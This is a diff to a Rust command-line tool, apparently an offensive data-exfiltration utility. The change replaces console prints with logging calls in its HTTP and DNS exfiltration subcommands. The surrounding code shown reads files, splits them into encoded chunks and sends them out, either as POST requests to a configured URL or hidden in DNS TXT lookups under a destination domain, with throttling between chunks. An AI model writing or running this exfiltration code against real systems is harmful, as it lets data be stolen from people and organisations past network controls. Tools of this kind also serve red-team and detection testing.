@@ -65,12 +65,12 @@ impl CommandHandler for HTTPExfiltrationSubCommand {
     /// via the `crate::error::Result` type.
     fn handle(self) -> crate::error::Result<()> {
         for file_path in self.files_path.iter() {
-            println!("[*] Reading file {}", file_path.to_string_lossy());
+            log::info!("Reading file {}", file_path.to_string_lossy());
 
             for payload_chunk in
                 crate::encoders::http::b64_encode_file(&file_path, self.chunks as usize)?
             {
-                println!("[*] Sending chunk: {}", payload_chunk);
+                log::info!("Sending chunk: {}", payload_chunk);
 
                 reqwest::blocking::Client::new()
                     .post(&self.url)
@@ -148,14 +148,16 @@ impl CommandHandler for DNSExfiltrationSubCommand {
     ///   to the configured resolver; this allows an authoritative server for
     ///   `destination` to receive the payload via the query name.
     fn handle(self) -> crate::error::Result<()> {
-        println!("[*] Reading file {}", self.file_path.to_string_lossy());
-        println!("[*] Encoding payload.");
+        log::info!("Reading file {}", self.file_path.to_string_lossy());
+        log::info!("Encoding payload.");
+
         let payload_chunks =
             crate::encoders::dns::encode_payload_dns_safe(&self.file_path, &self.destination)?;
 
         let resolver_config = match self.nameserver {
             Some(name_server) => {
-                println!("[*] Setting DNS resolver {:?}", self.nameserver);
+                log::info!("Setting DNS resolver {:?}", self.nameserver);
+
                 let mut resolver_config = hickory_resolver::config::ResolverConfig::new();
                 resolver_config.add_name_server(hickory_resolver::config::NameServerConfig::new(
                     name_server,
@@ -166,7 +168,6 @@ impl CommandHandler for DNSExfiltrationSubCommand {
             None => hickory_resolver::config::ResolverConfig::default(),
         };
 
-        println!("[*] Creating async runtime");
         let tokio_runtime = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
         let resolver = hickory_resolver::Resolver::builder_with_config(
             resolver_config,
@@ -175,9 +176,10 @@ impl CommandHandler for DNSExfiltrationSubCommand {
         .build();
 
         for chunk in payload_chunks.iter() {
-            println!("[*] Sending chunk: {}", chunk);
-            tokio_runtime
-                .block_on(resolver.txt_lookup(format!("{}.{}.", chunk, self.destination)))?;
+            let dns_query = format!("{}.{}.", chunk, self.destination);
+            log::info!("Sending chunk: {}", dns_query);
+
+            tokio_runtime.block_on(resolver.txt_lookup(dns_query))?;
 
             std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
         }
